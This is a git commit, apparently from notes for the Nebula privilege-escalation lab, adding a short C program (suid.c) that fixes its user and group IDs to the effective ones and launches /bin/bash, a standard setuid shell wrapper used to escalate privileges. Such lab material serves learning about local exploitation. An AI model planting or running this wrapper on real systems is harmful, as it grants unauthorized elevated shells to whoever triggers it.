baccf7a3026301bf6f672b7e71c358cfd2189e4c
root <root@localhost.localdomain>
2020-03-17 15:34:35 -0400

    Updated notes for Nebula

---
+++ nebula/suid.c
@@ -0,0 +1,15 @@
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <string.h>
+
+int main() {
+
+    gid_t gid = getegid();
+    uid_t uid = geteuid();
+    setresgid(gid,gid,gid); setresuid(uid,uid,uid);
+    system("/bin/bash");
+    return 0;
+}
